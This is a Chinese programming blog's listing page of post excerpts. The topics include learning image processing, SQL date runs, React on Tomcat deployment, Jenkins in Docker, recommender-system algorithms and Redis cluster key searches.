万变不离其宗，算法是死的，重在思想。举个例子，我个人是主攻模式识别方向，在这个方向判断一个学生是否入门有一个非常简单的方法，就是“如果你能把图像很自然的想象成高维空间中的一个点”，那就说明在模式识别方面入门了，可以对图像进行分类了。当然标准不是唯一，在其他领域如目标检测也会有其他的判断标准，总之我们要对图像进行处理，那么图像就不再只是图像，它可能会演变成各种不同形式的概念，可能是点，可能是面，还可能是一个坐标空间。在目标跟踪的经典算法粒子滤波中，将一个个的小图像块看做一个个粒子；在子空间理论中，将一系列图像放在一起构建一个成分主空间（例如主成分分析PCA算法等等。，我不会详细介绍这些算法，说多了就显得抽象老套，但我要说的是我们一定要把图像本身理解好，它是一个图像，是一个矩阵，是一个信息的容器，是一种数据的表现形式，图像不一定都必须在视觉上有意义（比如频域的图像）。
总之图像处理的基本思想还是要立足于图像本身，要深度到图像内部结构中，思维要灵活。我当时做本科毕设时，怎么也不知道图像和高维空间中的点之间有什么对应关系，后来总算有一天，突然就明白了，这也就是所谓的量变产生质变。总之一定要多想，多总结，主动去钻研，才能够真正领悟一些东西。最基本的东西往往蕴藏着深奥的道理，无论你现在多牛多厉害，都不能放掉最本源的东西。多想想图像是什么，有什么本质属性，你可能无法得到准确的答案，但肯定能得到一些有用的感悟（有点像哲学问题了）。
3、算法研究
算法研究应该是图像处理的核心工作，尤其是各大高校的博士硕士。这里我并不想谈那些高大上的算法，我更想说的是一些算法研究的一些基础的东西，比如说一些基础课程，比如说矩阵运算。
研究图像处理的算法，离不开数学。在这里我建议图像处理方面的硕士一定要上两门课：《泛函分析》以及《最优化算法》，有的学校已经将这两门课列为了研究生阶段的必修课程。这两门可可以说是图像处理（至少是模式识别）的基础。我当初没上过最优化算法，但后来也自己补上了，不然真的是寸步难行。至于泛函我当时听课的时候也不是很懂，但是在之后的研究过程中发现很多图像处理的基本知识基本理论都和泛函分析中枯燥的定理如出一辙，没办法，有的东西本身就是枯燥的干货，学着费力，缺它不行。
其次我想说的是矩阵运算。图像就是矩阵，图像处理就是矩阵运算。大家为什么都喜欢用Matlab，就是因为它的矩阵运算能力实在是太强大，在Matlab的世界中任何变量都是矩阵。同样OpenCv之所以能流行，不仅仅是因为它良好的封装性，也是因为它的矩阵格式，它定义了Mat基础类，允许你对矩阵进行各种操作。Python也不例外，它的Numpy就是一个专门的线性代数库。
真正在图像编程过程中，那些看着高大上的API函数归根到底都是工具，查查手册就能找到，真正核心还是在算法，算法是由公式编写的，公式的单元是变量，而图像届的变量就是矩阵。所以，熟练去操作矩阵，求秩、求逆、最小二乘，求协方差，都是家常便饭。所以，如果你有幸能上《矩阵分析》这门课，一定要把它看懂，那里面都是干货。
小结
总之，图像处理就是一个典型的门槛低、厅堂深的领域。不需要太多基础，学过线性代数，会一点编程就够了；但是那些算法却深不可测，是个消耗功夫的活儿。在写这篇教程时我说的很直白，就像和大家对话一样，想到什么说什么。在最后我想说两句题外话，就是不仅仅针对图像处理，对于其他新技术的入门学习也是一样，尽快迈出第一步，尽快去建立自信和成就感，让自己有勇气走下去，然后缺什么补什么就行了。我觉得真正让人望而却步的往往不是技术本身，而是我们对自身的不自信。唯有果断开工，才能战胜心魔。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a59c7bc08228618f0e87dfe76a077257/" rel="bookmark">
			SQL经典问题：找出连续日期及连续的天数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		create table tmptable(rq datetime) go insert tmptable values('2010.1.1') insert tmptable values('2010.1.2') insert tmptable values('2010.1.3') insert tmptable values('2010.1.6') insert tmptable values('2010.1.7') insert tmptable values('2010.1.10') insert tmptable values('2010.1.11') insert tmptable values('2010.1.12') insert tmptable values('2010.1.19') insert tmptable values('2010.1.20') insert tmptable values('2010.1.22') insert tmptable values('2010.1.23') insert tmptable values('2010.1.28') go ---希望得到的结果 --本期起始日期 本期终止日期 持续天数 距上一期天数 --2010.1.1 2010.1.3 3 0 --2010.1.6 2010.1.7 2 3 --2010.1.10 2010.1.12 3 3 --2010.1.19 2010.1.20 2 7 --2010.1.22 2010.1.23 2 2 --2010.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a59c7bc08228618f0e87dfe76a077257/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0fe5d208fc48f22e5d269b3563148d3/" rel="bookmark">
			React项目部署在Tomcat中的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主辛辛苦苦敲的react代码，结果想部署到Tomcat中一直都无法显示。之后便走访百度、谷歌，终于找到了项目部署失败的原因，下面将进行一下总结。
部署方法： 使用npm run build将项目打包把打包后的文件夹中内容放到tomcat中webapps下的Root中开启服务器访问localhost:8080端口即可以看到你的项目内容 不放置在Root目录下的坑： 由于默认path.js【路径：你的react项目名\node_modules\react-scripts\config\path.js】的配置是’/’即对根目录有效，所以如果不放在root下则需要将’/’变成’./’即相对路径有效。（修改代码约在第45行） 此时你可以通过localhost:8080/项目名 进行访问你的react项目
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2e1190d9385cc9e339e77b16e7e51cc/" rel="bookmark">
			word转PDF不能显示中文字体问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		maven依赖
&lt;dependency&gt; &lt;groupId&gt;fr.opensagres.xdocreport&lt;/groupId&gt; &lt;artifactId&gt;org.apache.poi.xwpf.converter.pdf&lt;/artifactId&gt; &lt;version&gt;1.0.4&lt;/version&gt; &lt;/dependency&gt; java 代码实现
/** * PdfConverter 转PDF * @param sfileName * @param toFileName * @return */ public static boolean wordToPDF(String sfileName, String toFileName){ OutputStream out = null; try { XWPFDocument document=new XWPFDocument(new FileInputStream(new File(sfileName))); // File outFile = new File(toFileName); outFile.getParentFile().mkdirs(); out = new FileOutputStream(outFile); //gb2312 PdfOptions options= PdfOptions.create(); PdfConverter.getInstance().convert(document,out,options); }catch (FileNotFoundException e){ LoggerUtil.error(PrintOpreateWord.class,e.getMessage(),e); return false; } catch (IOException e) { LoggerUtil.error(PrintOpreateWord.class,e.getMessage(),e); return false; } finally { if(out !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2e1190d9385cc9e339e77b16e7e51cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/018845b9363e08bae4c1f0034f497e65/" rel="bookmark">
			curl time
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# cat curl-format.txt time_namelookup: %{time_namelookup} \n time_connect: %{time_connect} \n time_appconnect: %{time_appconnect} \n time_redirect: %{time_redirect} \n time_pretransfer: %{time_pretransfer} \n time_starttransfer: %{time_starttransfer} \n time_total: %{time_total} \n curl -w "@curl-format.txt" -o /dev/null -s -L http://test-domain.com 转载于:https://www.cnblogs.com/allenhaozi/p/9478090.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66994088ec2119500c4190e47aca85b5/" rel="bookmark">
			获取搜索引擎关键字的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		if (refer != '') {
domain = refer.match(/http:\/\/www\.([^\/]+)\//)[1];
var kwArr = [{ "dm": "so.com", "kw": "q", "name": "360" }, { "dm": "google.com.hk", "kw": "q", "name": "谷歌香港" }, { "dm": "baidu.com", "kw": "wd|word", "name": "百度" }, { "dm": "soso.com", "kw": "w", "name": "搜搜" }, { "dm": "yahoo.com", "kw": "q", "name": "雅虎" }, { "dm": "bing.com", "kw": "q", "name": "bing" }, { "dm": "sogou.com", "kw": "query", "name": "搜狗" }, { "dm": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66994088ec2119500c4190e47aca85b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c0910812c88d045dffc9a6641783a37/" rel="bookmark">
			ModelSim仿真错误集锦！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ModelSim仿真过程中经常出现很多错误，我们知道在Quartus中调用RTL Simulation（寄存器传输水平的仿真）会自动自动打开安装ModelSim仿真软件。在不能出现波形文件的时候常常是这些问题：
需要开发者向上定位到错误所在位置，一般出现红色的还需要往上查找错误。。。。 1、Missing instance name in instantiation of 'xxx'. xxx为模块名，这说明你在testbench文件中调用的xxx模块，但是没有给实例名
修改方法： 查看文件为模块【添加实例名】
2、near "initial": syntax error, unexpected initial, expecting ';'
在initial模块附近缺少分号" ; "
3、
# ** Error: (vsim-3053) C:/Users/tlm/Desktop/cnt_8/prj/cnt_tb.v(19): Illegal output or inout port connection for "port 'RST_N'".
#
# Region: /cnt_tb/cnt_ins
# Error loading design
指明了cnt_tb模块中实例名cnt_ins的信号RST_N没有连接，或者连接错误
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1db50ba3b831043a5af40cec9dea119/" rel="bookmark">
			用 Python 自动生成 Word 文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当然要用第三方库啦 :)
使用以下命令安装：
pip install python-docx
使用该库的基本步骤为：
1.建立一个文档对象（可自动使用默认模板建立，也可以使用已有文件）。
2.设置文档的格式（默认字体、页面边距等）。
3.在文档对象中加入段落文本、表格、图像等，并指定其样式。
4.保存文档。
注：本库仅支持生成Word2007以后版本的文档类型，即扩展名为.docx 的。
下面分步介绍其基本使用方法：
步骤一：
from docx import Document doc = Document() #以默认模板建立文档对象 doc = Document('a.docx') # 读取a.docx文档，建立文档对象 步骤二：
from docx.shared import Inches,Pt def chg_font(obj,fontname='微软雅黑',size=None): ## 设置字体函数 obj.font.name = fontname obj._element.rPr.rFonts.set(qn('w:eastAsia'),fontname) if size and isinstance(size,Pt): obj.font.size = size distance = Inches(0.3) sec = doc.sections[0] # sections对应文档中的“节” sec.left_margin = distance # 以下依次设置左、右、上、下页面边距 sec.right_margin = distance sec.top_margin = distance sec.bottom_margin = distance sec.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1db50ba3b831043a5af40cec9dea119/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a77b2279727b1c363c1c2a8c74d84f30/" rel="bookmark">
			STM32介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
STM32 分类
STM8 和 STM32 分类
STM32 命名方法
​
STM32F103RCT6
寻找 IO 的功能
存储器映射
存储器 Block0 内部区域功能划分
存储器 Block1 内部区域功能划分
存储器 Block2 内部区域功能划分
寄存器映射
stm32f10x_it.c、 stm32f10x_conf.h 和 system_stm32f10x.c 文件
“assert_param”宏
启动文件简介
FLASH：我们的程序就放在这里。
0x0800 0000 ~ 0x0807 FFFF (512KB) 0x0800 0000 ~ 0x0803FFFF (256KB)
STM32，从字面上来理解， ST 是意法半导体， M 是 Microelectronics 的缩写， 32 表示32 位，合起来理解， STM32 就是指 ST 公司开发的 32 位微控制器。
ARM 公司推出了其全新的基于 ARMv7 架构的 32 位 CortexM3 微控制器内核。紧随其后， ST（意法半导体）公司就推出了基于 Cortex-M3 内核的MCU—STM32。 STM32 凭借其产品线的多样化、极高的性价比、简单易用的库开发方 式，迅速在众多 Cortex-M3 MCU 中脱颖而出，成为最闪亮的一颗新星。 STM32 一上市就 迅速占领了中低端 MCU 市场，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a77b2279727b1c363c1c2a8c74d84f30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f5b5a1741d74b03ea69fa00d00b92da/" rel="bookmark">
			使用JOL工具查看java中类的字段分布情况
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文是郑雨迪老师的“深入拆解 Java 虚拟机”第10节 | Java对象的内存布局 的课后作业
下载jol-cli-0.9-full.jar
JOL简介：
可以查阅java虚拟机中对象的内存分布，是OpenJDK的Code Tools项目中的工具，具体可以通过如下两套指令来实现：
$ java -jar /path/to/jol-cli-0.9-full.jar internals java.util.HashMap
$ java -jar /path/to/jol-cli-0.9-full.jar estimates java.util.HashMap
D:\CQQ&gt;java -cp jol-cli-0.9-full.jar org.openjdk.jol.Main internals java.lang.String # WARNING: Unable to get Instrumentation. Dynamic Attach failed. You may add this JAR as -javaagent manually, or supply -Djdk.attach.allowAttachSelf # WARNING: Unable to attach Serviceability Agent. Unable to attach even with module exceptions: [org.openjdk.jol.vm.sa.SASupportException: Sense failed., org.openjdk.jol.vm.sa.SASupportException: Sense failed., org.openjdk.jol.vm.sa.SASupportException: Sense failed.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f5b5a1741d74b03ea69fa00d00b92da/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bdc839f52f7766397a08c825235ac14/" rel="bookmark">
			docker 安装 jenkins
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装Jenkins 下载Jenkins 命令：sudo docker pull jenkins
启动Jenkins前准备 创建jenkins文件夹
创建jenkins文件夹，用于和容器内文件夹做磁盘挂载
命令:mkdir /home/hzq/jenkins
注意：在安装jenkins时候，挂在文件夹/home/hzq/jenkins/的归属用户id必须是1000，否则会抛出无操作权限异常。异常如下：
为什么文件夹的归属用户Id必须是1000？
对于初次接触jenkins的我来说，确实挺郁闷的。为什么UID必须是1000？带着疑问我去查看了Docker中央仓库提供的Dockerfile，在这里面看到了如下的代码：
查看文件夹的归属者
命令：ls -nd 文件夹名称
修改文件夹的归属者和组
命令：sudo chown -R 1000:1000 jenkins/
启动Jenkins 启动jenkins
命令：
sudo docker run -itd -p 8080:8080 -p 50000:50000 --name jenkins --privileged=true -v /home/hzq/jenkins:/var/jenkins_home jenkins 1 -p 8080:8080 -p 50000:50000 进行端口映射
--privileged=true 在CentOS7中的安全模块selinux把权限禁掉了，参数给容器加特权。
-v /home/hzq/jenkins:/var/jenkins_home 磁盘挂载
查看运行状态
命令： sudo dockers ps
初次使用Jenkins 1、获取管理员密码： 在浏览器输入“localhost:8080”进入Jenkins，首次进入需要获取管理员的密码，如图：
获取密码方式一：
在jenkins启动的时候，我们设置了文件夹的挂在，所以我们直接可以在本地jenkins目录下查看密码：
获取密码方式二：
在没有挂在磁盘时，获取密码
命令： sudo docker exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4bdc839f52f7766397a08c825235ac14/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f9fdef3c4c432c13d2387bf89e70175/" rel="bookmark">
			推荐系统概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是推荐系统 在具体聊推荐系统之前，我们先来了解一下获取信息的两种基本机制，第一是主动获取，第二是被动获取。 主动获取信息 对于信息主动获取的方式，最典型的有两种，一个是搜索，另一个是导航。 对于搜索，百度和谷歌通过解决用户的信息主动检索问题，便能成就一个产业，所以对于信息主动获取的需求是很巨大的。 对于另一个主动信息获取的方式，即导航。在门户时代，门户网站的分门别类的各色频道，以及频道下对应的各级菜单其实就是一种导航，再到目前国内遥遥领先世界的电子商务领域，其各色平台，少不了的就是类目导航。导航提供的是一种通用的目录结构，人们通过对信息的认知，再结合通用的树状结构，逐步检索到自己需要的信息。 被动获取信息 对于大部分的场景中，至少过半的用户并不是抱着一个很明确的目的去使用的，大部分都是一种随意看看、随便逛逛的心态，这就意味着被动信息获取的场景我们同样需要去满足。虽然用户是随便看看、随便逛逛，但作为被逛的主体方可不能带着这种心态，我们必须在用户的随便行为中，把用户给牢牢吸引住，不然就不知不觉地给逛走了。这就涉及到了被动信息获取机制中的推荐系统。对于用户来说，推荐是一种被动的行为，主体方意图通过推荐的方式将最吸引用户或者说用户最可能感兴趣的东西被动呈现给用户。和搜索引擎不同，个性化推荐系统需要依赖用户的行为数据。通过推荐的方式，缩短用户与其潜在需求信息的路径，从而提升用户的体验、提升用户的粘性。 再回到什么是推荐系统 对于推荐系统的定义有不少，但被广泛接受的推荐系统的概念和定义是Resnick和Varian在1997年给出的：“它是利用电子商务网站向客户提供商品信息和建议，帮助用户决定应该购买什么产品，模拟销售人员帮助客户完成购买过程”。推荐系统就是根据用户的历史行为、社交关系、兴趣点、所处上下文环境等信息去判断用户当前需要或感兴趣的物品/服务的一类应用。 推荐系统有3个重要的模块：用户建模模块、推荐对象建模模块、推荐算法模块。通用的推荐系统模型流程如图1所示。推荐系统把用户模型中兴趣需求信息和推荐对象模型中的特征信息匹配，同时使用相应的推荐算法进行计算筛选，找到用户可能感兴趣的推荐对象，然后推荐给用户。 注意,推荐系统不等于推荐算法。 图1 推荐系统通用模型
2.常见的推荐算法 既然推荐算法是推荐系统中的核心，我们有必要对常规常见的一些推荐算法有个直观的认知，然后再结合自身的产品体验对推荐算法的一些逻辑进一步深入的理解。
基于内容属性的推荐 这种推荐逻辑很简单，只是单纯的依赖物品之间的属性相似来构建推荐关系，结合导读中的腾讯视频推荐的例子，比如如果我在看《蜘蛛侠3》，你给我推荐《钢铁侠》、《蝙蝠侠》，理论上是有一定道理的，都是科幻大片嘛，说不定还是同个系列呢。 所以，基于内容的推荐，容易理解，并且很多时候还是有一定效果的，但实际上很多时候会存在这几种情况，导致了这种原始推荐失效。 如果用户浏览当前的物品本身就不是用户的菜，甚至是一个非优质信息（当前主体不可控），再基于当前物品进行推荐就是个伪命题。 基于上面这条，即使当前主体是用户的目标，但再推类似主体会造成信息冗余，即当前主体信息已经解决了用户的问题。 所以，由于用户行为的不可控，基于内容属性相似的推荐，风险还是挺高的，这是导致了这种原始直接的机制并不会得到广泛的推广。 但与乱推荐相比，还是有一定正向作用的，毕竟用户浏览的主体是自身选择的结果，本身用户对于其选择的信息主体是有一定偏好性的。
基于画像的推荐 基于物品本身属性的推荐，其实与个性化是没有任何的关系，毕竟推荐候选集只跟物品主体有关，与用户无关，就谈不上什么个性化了。 而基于用户画像（更多人喜欢用基于用户标签）的推荐，则更大程度上依赖于用户的画像属性来推荐，这就体现了用户偏好信息，根据偏好信息来选择候选集。 这是一种很通用的做法，并且在大规模数据集情况下，在很多实际的产生过程中喜欢使用这种机制。而用户的画像，或者更具体点用户的兴趣标签如何构建呢？其实就是依赖用户累积的行为数据了，通过行为数据生成用户的兴趣标签。 这看似是一种相对靠谱的做法，毕竟如果把用户的爱好都分析清楚了，主动给用户做推荐不就显得很个性化了吗？在实际的场景中，首先，并不是所有用户的行为都足够用来表征其兴趣偏好的，即我们会高估用户的行为集合，从而产生有偏差的画像属性，更甚者，如果用户完全没有行为怎么办呢？ 其次，通常来说，用户的兴趣爱好是会随时间迁移而改变的，所以，把握用户的兴趣程度以及其变化并不是一个容易的事情，更何况用户实际的选择还会受很多因素影响，比如，我当前查找的一个信息并不是我之前掌握的信息，那意味着这些信息偏好在我的历史轨迹中都体现不出来，那单纯的通过我的兴趣去推荐就显得不靠谱了。 但不管怎么说，根据用户的偏好来做推荐，大方向肯定是没有问题的。
基于协同过滤的推荐 协同过滤，或许了解过推荐系统的的朋友，多多少少都能听过一些，并且协同推荐可是作为推荐领域典型案例而存在的。 协同过滤同样不会去研究物品的本身属性，甚至也没有空去构建用户的画像标签，正如他的名字描述的一样，他严重依靠于用户的行为以及其周边用户的协同行为。 举个例子，为一个用户推荐信息，那么我只需要参考其周边用户在看什么信息，就给他推荐什么信息就好了。 重点在于，如何限定周边这个范围，比如根据两个用户的行为，去构建相关关系，从而判断用户之间的相似程度，把相似用户的行为推荐给当前用户，这就是协同中典型的基于用户推荐。 而如果以物品为维度，以用户的购买或者观看记录为向量，则可以构建物品的相似度量，针对于每一个待推荐选项，用户的历史轨迹就是其向量构成，就可以判断该用户历史的轨迹信息与当前的待选物品的向量相关度了，从而判断是否要推荐，这就是基于物品的协同逻辑。 与基于用户画像的推荐对比，这种推荐有一定几率可以发现新物品，即并不严格依赖用户的兴趣。举个例子，假设几个信息的层级是 A、B、C，并且 A、B、C 是层级递进关系，并不是同一个东西，对于一个用户来说，他掌握的是 A，则意味着他的兴趣偏好大多偏向于 A，根据兴趣标签，其实是很难推荐这种递进相关的信息。 但是，如果其他用户的学习轨迹都是 A→B→C 这种轨迹，这意味着 A、B、C 三者之间本身就有前后潜在逻辑关系存在的，基于协同，即可为该用户在掌握 A 的基础上，推荐 B、C 的内容，这也是基于兴趣所做不到的地方。 当前，基于协同行为的推荐，除了基于物品还有基于用户，还有其他诸如基于模型的协同，典型如最近邻模型、基于矩阵分解以及基于图关系模型的构建的推荐机制。
基于关联规则的推荐 在上一篇中，相信大家有看到其中一个推荐场景的理由“看过 XX 的还看过”，或者“买过 XX 的用户还买过”类似的推荐理由。 实际上支撑类似理由的一个很重要的推荐算法就是关联规则。即我们通过一定的逻辑来寻找物品之间的相关关系，请注意是相关关系并不是相似关系，又或者说我们寻找并不是严格意义上属性上的相似，单纯只是为了寻找他们之间的关联性。 这就要从“啤酒与尿布”的故事说起，或许很多朋友已经听过这个故事，即超市对用户的的购物清单进行分析，发现一个很奇怪的现象，那就是很多经常在购买尿布的时候顺带会购买啤酒。 这是一个很奇怪的组合，单纯从物品属性的角度上看，两者之间很难有明面上的关系，但事实就是他们确实存在某种关联，超市于是将这两种商品放在同个货架中，于是大大提升了两者的搭配销售额，并且做了类似的计算，来优化整个货架陈列，从而提升销售额。 实际上这就是一个推荐场景，即在尿布的商品浏览的时候适当进行啤酒的推荐，从而提升搭配销售的效果，实际上这是一个关联分析的过程。 即通过他们历史的搭配售卖情况，来分析每个搭配之间的合理性，即分析不同商品组合之间的相关性，这种相关性很难去解释，但确实是在生效。
其他常见推荐算法 其实在我们实际的操作过程中，并不会严格的依赖于这种条条框框、只要合理即可行，比如我们完全可以把推荐问题转化为分类问题，针对于每个待选项，它都是 Yes or No 的问题，即一个二值分类。 再比如微信朋友圈，微信一定是会研究用户的朋友圈关系的，比如你对哪类朋友点赞、互动行为最多，它是不是会考虑推荐你欣赏的朋友偏好内容给你？毕竟微信是一个典型的熟人社交模型。 所以，推荐算法看似重要，但其实想想又没有这么重要，很多时候并不是一成不变的，都要我们根据场景去考虑，最最最重要的是，需要我们用实际效果来选择机制，也或许是多种机制共同生效的结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f9fdef3c4c432c13d2387bf89e70175/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfce37d90b7cbd2b72da58799faae49f/" rel="bookmark">
			给服务器安装Anaconda遇到的问题和解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先如果直接敲
bash Anaconda3-5.2.0-Linux-x86_64.sh 告诉我已存在
ERROR: File or directory already exists: '/root/anaconda3' If you want to update an existing installation, use the -u option. 需要使用
bash Anaconda3-5.2.0-Linux-x86_64.sh -u 之后提示没有安装bunzip2，使用以下指令安装，然后还是报错，这次是软件源有问题
[/root/anaconda3] &gt;&gt;&gt; PREFIX=/root/anaconda3 Anaconda3-5.2.0-Linux-x86_64.sh: line 350: bunzip2: command not found tar: This does not look like a tar archive tar: Exiting with failure status due to previous errors [root@ml-cent-3 result]# yum install -y bzip2 Loaded plugins: fastestmirror http://mirrors.163.com/centos/7/os/x86_64/repodata/repomd.xml: [Errno 14] curl#6 - "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfce37d90b7cbd2b72da58799faae49f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f18f9d912d0b3d51cfe81d74ca0fc36/" rel="bookmark">
			IFC构件的位置信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在IFC标准中，采用相对坐标系对构件定位。如柱(IfcColumn)的定位信息（局部坐标系及参考坐标系）由ObjectPlacement描述。ObjectPlacement由两部分组成：
（1）PlacementRelTo是参考坐标系。柱子的参考坐标系是楼层IfcBuidlingStorey所在的坐标系。IfcBuidlingStorey以IfcBuilding所在的坐标系为参考，IfcBuilding以IfcSite所在的坐标系为参考，IfcSite定义的是整体坐标系，没有参考坐标系。
（2）RelativePlacement是相对坐标系内的坐标转换。
坐标系存在多层参考的情况，在明确各构件层次关系的前提下，进行逐级查询确定构件的绝对坐标。
IFC文件的内容如下:
#6= IFCCARTESIANPOINT((0.,0.,0.)); #31= IFCAXIS2PLACEMENT3D(#6,$,$); #32= IFCLOCALPLACEMENT(#311,#31); #114= IFCBUILDING('1BNyUUMcj6ywEAW7k0zZlo',#41,'',$,$,#32,$,'',.ELEMENT.,$,$,#110); #120= IFCAXIS2PLACEMENT3D(#6,$,$); #121= IFCLOCALPLACEMENT(#32,#120); #123= IFCBUILDINGSTOREY('1BNyUUMcj6ywEAW7j$2VSC',#41,'\X2\68079AD8\X0\ 1',$,$,#121,$,'\X2\68079AD8\X0\ 1',.ELEMENT.,0.); #310= IFCAXIS2PLACEMENT3D(#6,$,$); #311= IFCLOCALPLACEMENT($,#310); #312= IFCSITE('1BNyUUMcj6ywEAW7k0zZln',#41,'Default',$,'',#311,$,$,.ELEMENT.,(42,21,31,181945),(-71,-3,-24,-263305),0.,$,$); #165= IFCCARTESIANPOINT((-7318.22370947408,711.194038980438,0.)); #167= IFCAXIS2PLACEMENT3D(#165,$,$); #168= IFCLOCALPLACEMENT(#121,#167); #170= IFCCOLUMN('0Ae7iOjK982gh$h7PwMCca',#41,'M_\X2\77E95F6267F1\X0\:475 x 610mm:203111',$,'475 x 610mm',#168,#161,'203111'); #170是柱子（IfcColumn），位置信息由#168（IfcLocalPlacement）定义。
#168（IfcLocalPlacement）指定了#121（IfcLocalPlacement，参考坐标系）和#167（IfcAxis2Placement3D，局部坐标系）。
#121（IfcLocalPlacement）是楼层#123（IfcBuidlingStorey）所在的坐标系。它指定了#32（IfcLocalPlacement，参考坐标系）和#120（IfcAxis2Placement3D，局部坐标系）。
#32（IfcLocalPlacement）是建筑物#114（IfcBuilding）所在的坐标系。它指定了#311（IfcLocalPlacement，参考坐标系）和#31（IfcAxis2Placement3D，局部坐标系）。
#311（IfcLocalPlacement）是场地#312（IfcSite）所在的坐标系，它是整体坐标系，没有参考坐标系。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f560b4d13ae599ea4c31be96ce0484a/" rel="bookmark">
			SemanticException [Error 10295]: INSERT OVERWRITE not allowed on table with OutputFormat that implem
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在数据梳理的时候，通过hive创建了一个外部表，但是在插入表的时候使用了INSERT OVERWRITE TABLE Table SELECT,于是报了SemanticException [Error 10295]: INSERT OVERWRITE not allowed on table with OutputFormat that implements AcidOutputFormat while transaction manager that supports ACID is in use (state=42000,code=10295)，通过搜索发现原来是overwrite 问题，解决方法：要么重建外部表为管理表，要么用insert into + truncate 方法重写表。
具体参考：https://community.hortonworks.com/questions/38807/hive-overwrtite-table.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c8362d0ad3044440b1ed4e22449561d/" rel="bookmark">
			Redis集群使用keys命令搜索匹配的Key
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求 今天在项目过程中碰到了一个需求：
1.所有节点（数量在1～10万）都会存储一个在线状态的Key在Redis集群，3分钟失效， 收到节点上报的任何数据后，刷新这个缓存。
2.需定时查询所有节点在Redis的状态，并将节点状态同步到数据库。
问题 因为Redis只有顶级的Key才可以设置超时时间，所以无法使用hset,hgetAll命令一次
性获取所有的节点信息，只有使用get(key)方法一个一个获取设备的在线状态，由于
Redis是单线程应用，这就造成了比较严重的性能问题。
经测试循环获取8万个节点的在线状态，耗时会达到50s左右，这是完全无法容忍的。
而项目中为保证可靠性，使用的是Redis集群，Redis操作都必须通过JedisCluster的
接口来实现，故而也无法使用Jedis的keys(pattern)方法来一次性搜索所有的在线节
点的Key。
解决思路 网络上搜索了一些解决方法，都感觉有些复杂，所以自己考虑是否可以用更简单的方
式解决这个问题。
思路是Redis集群有6个节点，其中有3个主节点，每个主节点各自有一个从节点，其
实只需要将集群视为3个单独的Redis，分别用keys(pattern)方法搜索各自的key，然
后把3次搜索的结果相加，就是集群内所有的Key了。
JedisCluster在网上的API很少，进去这个类看了一下，发现有一个方法：
Map&lt;String,JedisPool&gt; getClusterNodes(); 复制代码 根据方法名和返回值判断，这应该就是我要找的获取Redis集群所有节点的方法了，
写了个方法测试了一下，果然可以拿到集群内所有的节点，那剩下的事情就好办了。
最终的搜索集群内匹配的Key方法如下：
